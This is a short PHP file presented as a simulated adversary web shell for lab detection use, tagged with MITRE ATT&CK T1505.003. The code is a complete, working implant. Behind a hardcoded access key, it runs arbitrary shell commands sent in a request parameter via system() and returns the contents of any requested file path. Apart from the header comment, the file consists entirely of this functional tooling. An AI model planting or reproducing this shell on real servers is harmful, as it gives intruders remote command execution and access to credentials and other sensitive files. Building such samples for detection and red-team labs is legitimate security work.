<?php
/**
 * Simulated Adversary Web Shell Payload
 * MITRE ATT&CK: T1505.003 (Server Software Component: Web Shell)
 * FOR EDUCATIONAL AND LAB DETECTION USE ONLY
 */

header('Content-Type: text/plain');
$auth_key = "atlas_redteam_2026";

if (!isset($_REQUEST['key']) || $_REQUEST['key'] !== $auth_key) {
    http_response_code(403);
    die("Access Denied: Invalid Key\n");
}

if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    echo "=== COMMAND OUTPUT ===\n";
    system($cmd . " 2>&1");
    echo "\n=== END OF OUTPUT ===\n";
    exit;
}

if (isset($_REQUEST['read'])) {
    $file = $_REQUEST['read'];
    if (file_exists($file)) {
        echo file_get_contents($file);
    } else {
        echo "File not found: " . htmlspecialchars($file);
    }
    exit;
}

echo "ATLAS-WEBSHELL-ACTIVE\n";
